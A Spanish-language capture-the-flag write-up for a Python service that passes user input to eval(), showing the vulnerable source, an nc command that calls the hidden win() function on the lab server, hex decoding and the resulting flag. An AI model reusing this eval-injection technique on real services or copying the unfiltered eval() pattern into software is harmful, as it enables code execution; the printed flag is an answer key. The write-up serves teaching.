## Descripción
This service can provide you with a random number, but can it do anything else?

## Solución
- Analizamos el código fuente del servicio en Python proporcionado en `picker-I.py`:
  ```python
  def win():
    # This line will not work locally unless you create your own 'flag.txt' in
    # the same directory as this script
    flag = open('flag.txt', 'r').read()
    flag = flag.strip()
    str_flag = ''
    for c in flag:
      str_flag += str(hex(ord(c))) + ' '
    print(str_flag)

  while(True):
    try:
      print('Try entering "getRandomNumber" without the double quotes...')
      user_input = input('==> ')
      eval(user_input + '()')
    except Exception as e:
      print(e)
      break
  ```
- En el bucle principal, el programa recibe una entrada del usuario a través de `user_input` y la ejecuta dinámicamente mediante `eval(user_input + '()')`.
- Esto nos permite invocar cualquier función definida en el ámbito global del script. Al examinar las funciones disponibles, encontramos `win()`, la cual lee el archivo `flag.txt` en el servidor e imprime cada carácter en formato hexadecimal (`0x61 0x63 ...`).
- Nos conectamos a la instancia local xebec.cylabacademy.net:39371` mediante `nc` o un script en Python y enviamos la cadena `win`:
  ```bash
  echo "win" | nc xebec.cylabacademy.net 39371
  ```
- La respuesta obtenida del servicio es:
  ```text
  0x61 0x63 0x61 0x64 0x65 0x6d 0x79 0x7b 0x34 0x5f 0x64 0x31 0x34 0x6d 0x30 0x6e 0x64 0x5f 0x31 0x6e 0x5f 0x37 0x68 0x33 0x5f 0x72 0x30 0x75 0x67 0x68 0x5f 0x63 0x35 0x35 0x66 0x62 0x65 0x66 0x35 0x7d
  ```
- Decodificamos los valores hexadecimales a caracteres ASCII en Python:
  ```python
  hex_vals = "0x61 0x63 0x61 0x64 0x65 0x6d 0x79 0x7b 0x34 0x5f 0x64 0x31 0x34 0x6d 0x30 0x6e 0x64 0x5f 0x31 0x6e 0x5f 0x37 0x68 0x33 0x5f 0x72 0x30 0x75 0x67 0x68 0x5f 0x63 0x35 0x35 0x66 0x62 0x65 0x66 0x35 0x7d"
  flag = "".join(chr(int(h, 16)) for h in hex_vals.split())
  print(flag)
  ```
- Obtenemos la bandera:
```text
academy{4_d14m0nd_1n_7h3_r0ugh_c55fbef5}
```

## Notas Adicionales
- El uso de la función `eval()` sobre entradas directas del usuario representa una vulnerabilidad crítica de inyección de código / ejecución remota arbitraria (CWE-95).
- En este caso, al no existir ningún filtrado de nombres sobre `user_input`, es posible invocar directamente la función no documentada `win()`.
- Herramientas utilizadas:
  - `nc` (Netcat) / Python `socket`.
  - Intérprete de Python 3 para decodificar los valores hexadecimales.

## Referencias
- [CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')](https://cwe.mitre.org/data/definitions/95.html)
- [Python eval() documentation](https://docs.python.org/3/library/functions.html#eval)
